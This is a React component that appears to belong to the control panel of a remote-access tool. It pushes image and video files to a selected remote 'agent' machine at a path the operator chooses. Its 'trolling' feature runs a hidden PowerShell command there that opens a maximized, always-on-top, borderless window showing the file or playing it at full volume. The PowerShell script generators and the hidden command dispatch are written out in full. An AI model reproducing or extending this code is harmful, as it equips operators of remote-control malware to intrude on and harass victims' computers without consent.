import React, { useState, useRef } from 'react';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
import { Alert, AlertDescription } from './ui/alert';
import { Progress } from './ui/progress';
import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2 } from 'lucide-react';
import { useSocket } from './SocketProvider';

interface PendingFile {
  id: string;
  file: File;
}

export function BulkUploadManager() {
  const { socket, connected, selectedAgent, uploadFile, sendCommand } = useSocket();
  const [files, setFiles] = useState<PendingFile[]>([]);
  const [folderPath, setFolderPath] = useState('');
  const [isDragging, setIsDragging] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [isUploading, setIsUploading] = useState(false);
  const [uploadingById, setUploadingById] = useState<Record<string, boolean>>({});
  const [progressById, setProgressById] = useState<Record<string, number>>({});
  const fileInputRef = useRef<HTMLInputElement>(null);

  const formatError = (err: unknown) => {
    if (err instanceof Error) return err.message;
    return String(err);
  };

  const generateImageTrollingScript = (imagePath: string): string => {
    return `Add-Type -AssemblyName PresentationFramework
$w = New-Object Windows.Window
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false

$i = New-Object Windows.Controls.Image
$b = New-Object Windows.Media.Imaging.BitmapImage
$b.BeginInit()
$b.UriSource = '${imagePath.replace(/\\/g, '\\\\')}'
$b.EndInit()
$i.Source = $b
$i.Stretch = 'UniformToFill'

$w.Content = $i
$w.ShowDialog()`;
  };

  const generateVideoTrollingScript = (videoPath: string): string => {
    return `Add-Type -AssemblyName PresentationFramework

$w = New-Object Windows.Window
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false
$w.Background = 'Black'

$m = New-Object Windows.Controls.MediaElement
$m.Source = '${videoPath.replace(/\\/g, '\\\\')}'
$m.LoadedBehavior = 'Play'
$m.UnloadedBehavior = 'Stop'
$m.Stretch = 'UniformToFill'
$m.Volume = 1.0

$w.Content = $m
$w.ShowDialog()`;
  };

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
    const fileList = event.target.files;
    if (fileList) {
      processFiles(Array.from(fileList));
    }
  };

  const handleDrop = (event: React.DragEvent) => {
    event.preventDefault();
    setIsDragging(false);
    const fileList = event.dataTransfer.files;
    if (fileList) {
      processFiles(Array.from(fileList));
    }
  };

  const makeId = () => {
    try {
      return crypto.randomUUID();
    } catch {
      return Math.random().toString(36).slice(2);
    }
  };

  const resolveDestinationPath = (basePath: string, filename: string) => {
    const raw = (basePath || '').trim();
    if (!raw) return filename;
    const lower = raw.toLowerCase();
    const filenameLower = filename.toLowerCase();
    if (lower.endsWith(`/${filenameLower}`) || lower.endsWith(`\\${filenameLower}`)) {
      return raw;
    }
    if (raw.endsWith('/') || raw.endsWith('\\')) {
      return `${raw}${filename}`;
    }
    if (/^[a-zA-Z]:$/.test(raw)) {
      return `${raw}\\${filename}`;
    }
    const separator = raw.includes('\\') || /^[a-zA-Z]:/.test(raw) ? '\\' : '/';
    return `${raw}${separator}${filename}`;
  };

  const processFiles = async (fileList: File[]) => {
    setError('');
    setSuccess('');
    
    const processedFiles: PendingFile[] = [];
    
    for (const file of fileList) {
      if (file.size > 50 * 1024 * 1024) {
        setError(`File ${file.name} is too large (max 50MB)`);
        continue;
      }

      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi', 'video/x-msvideo'];
      if (!allowedTypes.includes(file.type)) {
        setError(`File ${file.name} type not supported. Use: JPG, PNG, GIF, WebP, MP4, WebM, AVI`);
        continue;
      }

      processedFiles.push({ id: makeId(), file });
    }

    setFiles(prev => [...prev, ...processedFiles]);
    if (processedFiles.length > 0) {
      setSuccess(`Added ${processedFiles.length} files`);
    }
  };

  const uploadAndWait = async (pending: PendingFile, destinationPath: string) => {
    if (!socket || !connected) {
      throw new Error('Not connected');
    }
    if (!selectedAgent) {
      throw new Error('No agent selected');
    }

    const expectedDestinationPath = resolveDestinationPath(destinationPath, pending.file.name);

    setUploadingById(prev => ({ ...prev, [pending.id]: true }));
    setProgressById(prev => ({ ...prev, [pending.id]: 0 }));

    await new Promise<void>((resolve, reject) => {
      const maxMs = Math.min(20 * 60 * 1000, Math.max(90 * 1000, pending.file.size * 2));
      const timeoutId = window.setTimeout(() => {
        window.removeEventListener('file_upload_progress', onProgress);
        window.removeEventListener('file_upload_complete', onComplete);
        reject(new Error('Upload timed out'));
      }, maxMs);

      const cleanup = () => {
        window.clearTimeout(timeoutId);
        window.removeEventListener('file_upload_progress', onProgress);
        window.removeEventListener('file_upload_complete', onComplete);
      };

      const onProgress = (event: any) => {
        const data = event?.detail;
        if (!data) return;
        if (data.agent_id !== selectedAgent) return;
        if (data.filename !== pending.file.name) return;
        if (data.destination_path !== expectedDestinationPath) return;
        if (typeof data.progress === 'number' && data.progress >= 0) {
          setProgressById(prev => ({ ...prev, [pending.id]: data.progress }));
        }
      };

      const onComplete = (event: any) => {
        const data = event?.detail;
        if (!data) return;
        if (data.agent_id !== selectedAgent) return;
        if (data.filename !== pending.file.name) return;
        if (data.destination_path !== expectedDestinationPath) return;
        cleanup();
        setProgressById(prev => ({ ...prev, [pending.id]: 100 }));
        resolve();
      };

      window.addEventListener('file_upload_progress', onProgress);
      window.addEventListener('file_upload_complete', onComplete);
      uploadFile(selectedAgent, pending.file, expectedDestinationPath);
    });
  };

  const uploadSingle = async (pending: PendingFile) => {
    setError('');
    setSuccess('');
    try {
      await uploadAndWait(pending, folderPath);
      setFiles(prev => prev.filter(f => f.id !== pending.id));
      setSuccess(`File ${pending.file.name} uploaded successfully`);
    } catch (err) {
      setError(`Upload failed: ${formatError(err)}`);
    } finally {
      setUploadingById(prev => ({ ...prev, [pending.id]: false }));
    }
  };

  const startTrolling = async (pending: PendingFile) => {
    if (!selectedAgent) {
      setError('No agent selected');
      return;
    }

    const filePath = resolveDestinationPath(folderPath, pending.file.name);
    let script: string;

    if (pending.file.type.startsWith('image/')) {
      script = generateImageTrollingScript(filePath);
    } else if (pending.file.type.startsWith('video/')) {
      script = generateVideoTrollingScript(filePath);
    } else {
      setError('Unsupported file type for trolling');
      return;
    }

    try {
      await uploadAndWait(pending, folderPath);
      setFiles(prev => prev.filter(f => f.id !== pending.id));
      sendCommand(selectedAgent, `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`);
      setSuccess(`Trolling started with ${pending.file.name}`);
    } catch (err) {
      setError(`Trolling failed: ${formatError(err)}`);
    } finally {
      setUploadingById(prev => ({ ...prev, [pending.id]: false }));
    }
  };

  const uploadAllFiles = async () => {
    if (files.length === 0) {
      setError('No files to upload');
      return;
    }

    setIsUploading(true);
    setError('');
    
    let successCount = 0;
    let errorCount = 0;

    for (const pending of [...files]) {
      try {
        await uploadAndWait(pending, folderPath);
        setFiles(prev => prev.filter(f => f.id !== pending.id));
        successCount++;
      } catch (err) {
        errorCount++;
        setError(`Failed to upload ${pending.file.name}: ${formatError(err)}`);
      } finally {
        setUploadingById(prev => ({ ...prev, [pending.id]: false }));
      }
    }

    setIsUploading(false);
    setSuccess(`Uploaded ${successCount} files, ${errorCount} failed`);
  };

  const removeFile = (fileId: string) => {
    setFiles(prev => prev.filter(f => f.id !== fileId));
  };

  const getFileIcon = (type: string) => {
    if (type.startsWith('image/')) return <Image className="h-4 w-4" />;
    if (type.startsWith('video/')) return <Video className="h-4 w-4" />;
    return <File className="h-4 w-4" />;
  };

  const formatFileSize = (bytes: number) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle>Bulk File Upload & Trolling</CardTitle>
          <CardDescription>
            Upload files to selected agents and start trolling with images or videos
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}
          
          {success && (
            <Alert>
              <AlertDescription>{success}</AlertDescription>
            </Alert>
          )}

          <div className="space-y-2">
            <Label htmlFor="folder-path">Target Folder or Full Path</Label>
            <div className="flex gap-2">
              <Input
                id="folder-path"
                placeholder="C:\\Users\\Username\\Downloads"
                value={folderPath}
                onChange={(e) => setFolderPath(e.target.value)}
                className="font-mono"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => setFolderPath('C:\\Users\\')}
              >
                <Folder className="h-4 w-4" />
              </Button>
            </div>
          </div>

          <div
            className={`border-2 border-dashed rounded-lg p-8 text-center cursor-pointer transition-colors ${
              isDragging ? 'border-primary bg-primary/5' : 'border-border hover:border-primary'
            }`}
            onDragOver={(e) => {
              e.preventDefault();
              setIsDragging(true);
            }}
            onDragLeave={() => setIsDragging(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
          >
            <Upload className="mx-auto h-8 w-8 mb-2 text-muted-foreground" />
            <p className="text-sm text-muted-foreground mb-1">
              Drag and drop files here, or click to select
            </p>
            <p className="text-xs text-muted-foreground">
              Supports images (JPG, PNG, GIF, WebP) and videos (MP4, WebM, AVI)
            </p>
            <Input
              ref={fileInputRef}
              type="file"
              multiple
              accept="image/*,video/*"
              onChange={handleFileSelect}
              className="hidden"
            />
          </div>

          {files.length > 0 && (
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <h4 className="font-medium">Selected Files ({files.length})</h4>
                <Button
                  onClick={uploadAllFiles}
                  disabled={isUploading || !selectedAgent}
                  size="sm"
                >
                  <Upload className="h-4 w-4 mr-2" />
                  Upload All
                </Button>
              </div>
              
              <div className="space-y-1 max-h-64 overflow-y-auto">
                {files.map((pending) => (
                  <div
                    key={pending.id}
                    className="flex items-center gap-2 p-2 border rounded-md"
                  >
                    {getFileIcon(pending.file.type)}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2">
                        <p className="text-sm font-medium truncate">{pending.file.name}</p>
                        {uploadingById[pending.id] && (
                          <span className="text-xs text-muted-foreground tabular-nums">
                            {Math.min(100, Math.max(0, progressById[pending.id] ?? 0))}%
                          </span>
                        )}
                      </div>
                      <p className="text-xs text-muted-foreground">{formatFileSize(pending.file.size)}</p>
                      {uploadingById[pending.id] && (
                        <Progress value={Math.min(100, Math.max(0, progressById[pending.id] ?? 0))} className="h-1 mt-1" />
                      )}
                    </div>
                    <div className="flex gap-1">
                      <Button
                        onClick={() => startTrolling(pending)}
                        disabled={isUploading || uploadingById[pending.id]}
                        size="sm"
                        variant="outline"
                        title="Start trolling with this file"
                      >
                        <Play className="h-3 w-3" />
                      </Button>
                      <Button
                        onClick={() => uploadSingle(pending)}
                        disabled={isUploading || uploadingById[pending.id]}
                        size="sm"
                        variant="outline"
                        title="Upload file"
                      >
                        <Upload className="h-3 w-3" />
                      </Button>
                      <Button
                        onClick={() => removeFile(pending.id)}
                        disabled={uploadingById[pending.id]}
                        size="sm"
                        variant="outline"
                        title="Remove file"
                      >
                        <Trash2 className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {!selectedAgent && (
            <Alert>
              <AlertDescription>
                Please select an agent from the Agents tab to upload files and start trolling
              </AlertDescription>
            </Alert>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
